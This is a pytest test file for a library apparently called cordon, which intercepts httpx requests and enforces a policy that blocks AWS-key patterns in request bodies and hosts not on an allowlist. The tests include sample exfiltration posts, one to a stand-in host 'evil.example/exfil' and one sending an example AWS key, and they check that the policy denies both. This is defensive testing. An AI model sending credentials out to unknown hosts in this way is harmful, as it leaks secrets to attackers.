import asyncio
import json

import pytest

import cordon
from cordon import CordonDenied

httpx = pytest.importorskip("httpx")
respx = pytest.importorskip("respx")


POLICY = {
    "version": 1,
    "default": "allow",
    "rules": [
        {
            "id": "block-secret-exfil",
            "when": {
                "vendor": "http",
                "body_matches": "AKIA[0-9A-Z]{16}",
            },
            "action": "deny",
            "reason": "outbound body contains an AWS key",
        },
        {
            "id": "block-unknown-host",
            "when": {
                "vendor": "http",
                "host_not_in": ["api.github.com", "*.amazonaws.com"],
            },
            "action": "deny",
            "reason": "host not in allowlist",
        },
    ],
}


@pytest.fixture(autouse=True)
def _clean():
    yield
    cordon.uninstall()


def test_sync_secret_in_body_denied(tmp_path):
    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
    with pytest.raises(CordonDenied) as exc:
        with httpx.Client() as client:
            client.post(
                "https://api.github.com/leak",
                json={"creds": "AKIAIOSFODNN7EXAMPLE"},
            )
    assert exc.value.vendor == "http"
    assert exc.value.rule_id == "block-secret-exfil"
    entry = json.loads((tmp_path / "a.jsonl").read_text().strip())
    assert "AKIA" not in json.dumps(entry)  # redacted


def test_sync_unknown_host_denied(tmp_path):
    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
    with pytest.raises(CordonDenied) as exc:
        with httpx.Client() as client:
            client.post("https://evil.example/exfil", json={"x": 1})
    assert exc.value.rule_id == "block-unknown-host"


@respx.mock
def test_sync_allowed_passes_through(tmp_path):
    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
    respx.get("https://api.github.com/repos/a/b").mock(
        return_value=httpx.Response(200, json={"ok": True})
    )
    with httpx.Client() as client:
        r = client.get("https://api.github.com/repos/a/b")
    assert r.status_code == 200
    entry = json.loads((tmp_path / "a.jsonl").read_text().strip())
    assert entry["decision"] == "allow"
    assert entry["vendor"] == "http"


def test_async_secret_in_body_denied(tmp_path):
    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))

    async def go() -> None:
        async with httpx.AsyncClient() as client:
            await client.post(
                "https://api.github.com/leak",
                json={"creds": "AKIAIOSFODNN7EXAMPLE"},
            )

    with pytest.raises(CordonDenied) as exc:
        asyncio.run(go())
    assert exc.value.rule_id == "block-secret-exfil"


@respx.mock
def test_async_allowed_passes_through(tmp_path):
    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
    respx.get("https://api.github.com/repos/a/b").mock(
        return_value=httpx.Response(200, json={"ok": True})
    )

    async def go() -> int:
        async with httpx.AsyncClient() as client:
            r = await client.get("https://api.github.com/repos/a/b")
            return r.status_code

    assert asyncio.run(go()) == 200


def test_install_idempotent(tmp_path):
    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
    from cordon.shims import httpx_shim

    httpx_shim.install()
    with pytest.raises(CordonDenied):
        with httpx.Client() as client:
            client.post("https://evil.example/x")


def test_uninstall_removes_patch(tmp_path):
    cordon.init(policy=POLICY, audit=str(tmp_path / "a.jsonl"))
    cordon.uninstall()
    from cordon.shims import httpx_shim

    assert httpx_shim._installed is False
